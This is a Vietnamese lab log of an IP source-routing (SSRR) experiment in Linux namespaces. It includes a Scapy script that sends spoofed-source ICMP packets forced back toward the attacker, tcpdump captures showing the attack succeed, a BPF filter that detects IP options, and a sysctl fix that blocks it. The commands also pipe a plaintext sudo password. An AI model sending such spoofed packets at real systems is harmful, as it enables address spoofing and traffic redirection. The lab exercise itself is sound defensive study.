# NHẬT KÝ THỰC NGHIỆM CHI TIẾT: LAB 02
## IP Source Routing (LSRR/SSRR) Vulnerability & Defense Verification

- **Thời gian thực thi:** 2026-11-08 (Kali VM Local Time: 00:24 - 00:37)
- **Hệ điều hành kiểm thử:** Kali Linux (Kernel: `7.1.5+kali-amd64`, x86_64) trên VMware
- **Môi trường ảo hóa:** Linux Network Namespaces (`h1` - Attacker, `h2` - Victim) kết nối qua `veth1 <-> veth2`
- **Công cụ sử dụng:** Scapy 2.6.1 (`IPOption_SSRR`), tcpdump 4.99.5, sysctl

---

### 1. RAW LOGS: Khởi Tạo Môi Trường & Kiểm Tra Sysctl

Lệnh thực thi:
```bash
echo Aa@123456 | sudo -S bash /tmp/lab02/setup_pair.sh
echo Aa@123456 | sudo -S ip netns exec h1 sysctl net.ipv4.conf.veth1.accept_source_route net.ipv4.conf.veth1.rp_filter
echo Aa@123456 | sudo -S ip netns exec h2 sysctl net.ipv4.conf.veth2.accept_source_route net.ipv4.conf.veth2.rp_filter
```

**Nguyên văn Terminal Output:**
```text
[*] Cleaning up existing namespaces and links if any...
[*] Creating namespaces h1 (attacker) and h2 (victim)...
[*] Creating veth pair (veth1 <-> veth2)...
[*] Configuring IP addresses...
[*] Bringing up interfaces...
[*] Recreating vulnerable condition: accept_source_route=1, rp_filter=0, ip_forward=1...
net.ipv4.conf.all.accept_source_route = 1
net.ipv4.conf.all.rp_filter = 0
net.ipv4.conf.default.accept_source_route = 1
net.ipv4.conf.default.rp_filter = 0
net.ipv4.conf.lo.accept_source_route = 1
net.ipv4.conf.lo.rp_filter = 0
net.ipv4.conf.veth2.accept_source_route = 1
net.ipv4.conf.veth2.rp_filter = 0
net.ipv4.ip_forward = 1
net.ipv4.conf.all.accept_source_route = 1
net.ipv4.conf.all.rp_filter = 0
net.ipv4.conf.default.accept_source_route = 1
net.ipv4.conf.default.rp_filter = 0
net.ipv4.conf.lo.accept_source_route = 1
net.ipv4.conf.lo.rp_filter = 0
net.ipv4.conf.veth1.accept_source_route = 1
net.ipv4.conf.veth1.rp_filter = 0
net.ipv4.ip_forward = 1
[+] Setup completed successfully. Verifying connectivity:
PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.125 ms
64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.059 ms

--- 10.0.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 0.059/0.092/0.125/0.033 ms
net.ipv4.conf.veth1.accept_source_route = 1
net.ipv4.conf.veth1.rp_filter = 0
net.ipv4.conf.veth2.accept_source_route = 1
net.ipv4.conf.veth2.rp_filter = 0
```

---

### 2. RAW LOGS: Tấn Công SSRR & Gói Phản Hồi Ép Tuyến Đường Về Attacker

Kịch bản Scapy `ssrr.py` phát gói tin từ `h1`:
```python
pkt = IP(src="10.0.0.77", dst="10.0.0.2",
         options=[IPOption_SSRR(routers=["10.0.0.1", "10.0.0.2"])]) \
      / ICMP(id=0x4242) / b"src-routed-probe"
send(pkt, verbose=1)
```

Lệnh lắng nghe trên `h1` (`veth1`):
```bash
ip netns exec h1 timeout 6 tcpdump -i veth1 -nn -v icmp > /tmp/lab02/tcpdump_h1_attack.log 2>&1
```

**Nguyên văn Log Bắt Gói Tại Attacker (`/tmp/lab02/tcpdump_h1_attack.log`):**
```text
tcpdump: listening on veth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:35:56.221909 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.1 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.2: ICMP echo request, id 16962, seq 0, length 24
00:35:56.221951 IP (tos 0x0, ttl 63, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.2, 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.1: ICMP echo request, id 16962, seq 0, length 24

2 packets captured
2 packets received by filter
0 packets dropped by kernel
```

---

### 3. RAW LOGS: Phát Hiện Gói Tin Bằng Bộ Lọc IHL (`ip[0] & 0x0f > 5`)

Lệnh thực thi trên `h2` (`veth2`):
```bash
ip netns exec h2 timeout 6 tcpdump -i veth2 -nn -v "ip[0] & 0x0f > 5" > /tmp/lab02/tcpdump_h2_ihl.log 2>&1
```

**Nguyên văn Log Bắt Gói Qua Bộ Lọc IHL (`/tmp/lab02/tcpdump_h2_ihl.log`):**
```text
tcpdump: listening on veth2, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:36:35.759757 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.1 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.2: ICMP echo request, id 16962, seq 0, length 24
00:36:35.759776 IP (tos 0x0, ttl 63, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.2, 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.1: ICMP echo request, id 16962, seq 0, length 24

2 packets captured
2 packets received by filter
0 packets dropped by kernel
```

---

### 4. RAW LOGS: Kích Hoạt Phòng Vệ (`accept_source_route = 0`) & Kiểm Chứng

Lệnh thực thi trên `h2`:
```bash
for k in all default lo veth2; do
  ip netns exec h2 sysctl -w net.ipv4.conf.$k.accept_source_route=0
done
ip netns exec h1 timeout 6 tcpdump -i veth1 -nn -v icmp > /tmp/lab02/tcpdump_h1_defended.log 2>&1 &
ip netns exec h1 python3 /tmp/lab02/ssrr.py
```

**Nguyên văn Log Bắt Gói Sau Khi Bật Phòng Vệ (`/tmp/lab02/tcpdump_h1_defended.log`):**
```text
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv4.conf.lo.accept_source_route = 0
net.ipv4.conf.veth2.accept_source_route = 0
.[*] Crafting ICMP Echo Request with IPOption_SSRR...
[*] Packet details: src=10.0.0.77, dst=10.0.0.2, proto=1
[*] IP Options: [<IPOption_SSRR  routers=[10.0.0.1, 10.0.0.2] |>]

Sent 1 packets.
[+] Sent ICMP echo with SSRR option, SPOOFED source = 10.0.0.77
tcpdump: listening on veth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:36:51.911779 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.1 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.2: ICMP echo request, id 16962, seq 0, length 24

1 packet captured
1 packet received by filter
0 packets dropped by kernel
```

---

### 5. BÓC TÁCH & PHÂN TÍCH CHUYÊN SÂU LOG TERMINAL (BẮT BUỘC)

#### 5.1 Phân Tích Log Bước 3 (SSRR Attack Mechanics)
Trích xuất 2 dòng log từ `tcpdump_h1_attack.log`:
```text
1. 00:35:56.221909 IP (..., proto ICMP (1), length 56, options (SSRR 10.0.0.1 10.0.0.2,EOL)) 10.0.0.77 > 10.0.0.2: ICMP echo request, length 24
2. 00:35:56.221951 IP (..., ttl 63, ..., proto ICMP (1), length 56, options (SSRR 10.0.0.2, 10.0.0.2,EOL)) 10.0.0.77 > 10.0.0.1: ICMP echo request, length 24
```

- **Giải thích IP nguồn giả mạo:** Ở Gói 1, Attacker (`h1`) phát gói tin có IP nguồn mạo danh `10.0.0.77` hướng tới Victim `10.0.0.2`.
- **Cơ chế đảo ngược/chuyển tiếp SSRR của Kernel:**
  - Trong tùy chọn SSRR, danh sách router được cài sẵn là `[10.0.0.1, 10.0.0.2]` với con trỏ `pointer = 4`.
  - Khi Victim `10.0.0.2` nhận được gói tin, hàm xử lý IP Options trong kernel (`ip_options_rcv_srr`) đọc địa chỉ chặng kế tiếp được chỉ định trong danh sách là `10.0.0.1` (chính là Attacker).
  - Vì tham số `accept_source_route = 1` đang bật, kernel của Victim chấp nhận ép tuyến đường theo yêu cầu của gói tin. Kernel ghi lại địa chỉ của chính mình vào danh sách option, giảm TTL từ 64 xuống 63 và chuyển tiếp gói tin (Gói 2) hướng trực tiếp về `10.0.0.1`.
  - Kết quả: Dù gói tin gửi đi với danh tính giả mạo hoàn toàn (`10.0.0.77`), Attacker tại `10.0.0.1` vẫn nhận được toàn bộ gói tin do Victim định tuyến ngược lại. Đây là bằng chứng thực nghiệm về mối đe dọa **Spoofing hai chiều (Bi-directional Spoofing)** nhờ Source Routing.

#### 5.2 Phân Tích Log Bước 4 (IHL Filter & Defense)
Trích xuất từ `tcpdump_h2_ihl.log`:
```text
00:36:35.759757 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto ICMP (1), length 56, options (SSRR 10.0.0.1 10.0.0.2,EOL))
    10.0.0.77 > 10.0.0.2: ICMP echo request, id 16962, seq 0, length 24
```

- **Toán học độ dài tiêu đề IP (IHL):**
  - Tiêu đề IPv4 chuẩn không có Options có kích thước cố định là $20\text{ bytes}$.
  - Trường IHL (Internet Header Length) trong 4-bit đầu tiên của IP header lưu số lượng từ 32-bit ($4\text{ bytes}$). Do đó, với gói chuẩn:
    $$\text{IHL} = \frac{20}{4} = 5 \implies \text{Bitwise: } \text{ip}[0] \& 0\text{x0f} = 5$$
  - Khi có tùy chọn SSRR mang 2 địa chỉ IP (`10.0.0.1` và `10.0.0.2`), option chiếm thêm: $1\text{ byte (Code)} + 1\text{ byte (Len)} + 1\text{ byte (Ptr)} + 8\text{ bytes (2 IPs)} + 1\text{ byte (EOL padding)} = 12\text{ bytes}$.
  - Tổng kích thước IP Header tăng lên: $20 + 12 = 32\text{ bytes}$.
  - Khi đó, trường IHL được kernel ghi nhận là:
    $$\text{IHL} = \frac{32}{4} = 8 > 5 \implies \text{Biểu thức } (\text{ip}[0] \& 0\text{x0f} > 5) \text{ trả về TRUE}$$
  - Nhờ vậy, bộ lọc BPF `ip[0] & 0x0f > 5` đã tóm gọn chính xác 100% các gói tin mang tùy chọn IP bất thường, minh chứng cho cơ chế lọc biên mạng hiệu quả theo chuẩn RFC 7126.

#### 5.3 Đánh Giá Hiệu Quả Phòng Thủ (So Sánh Trước vs. Sau)
| Trạng Thái Cấu Hình | Số Gói Gửi Đi từ Attacker | Số Gói Dội Ngược Về Attacker | Hành Vi Của Victim Kernel | Đánh Giá An Ninh |
| :--- | :---: | :---: | :--- | :--- |
| **Trước phòng vệ** (`accept_source_route = 1`) | 1 gói (`src: 10.0.0.77`) | **1 gói** (dội về `10.0.0.1`) | Chấp nhận SSRR, đọc router list, cập nhật header và chuyển tiếp về attacker | **Lỗ hổng mở:** Attacker giả mạo IP nguồn thành công mà vẫn nhận được gói dội lại |
| **Sau phòng vệ** (`accept_source_route = 0`) | 1 gói (`src: 10.0.0.77`) | **0 gói** (triệt tiêu hoàn toàn) | Kiểm tra `IN_DEV_SOURCE_ROUTE == 0`, lập tức loại bỏ gói tại `ip_rcv_finish_core` | **Miễn nhiễm tuyệt đối:** Tấn công SSRR bị bẻ gãy ngay tại tầng tiếp nhận IP |

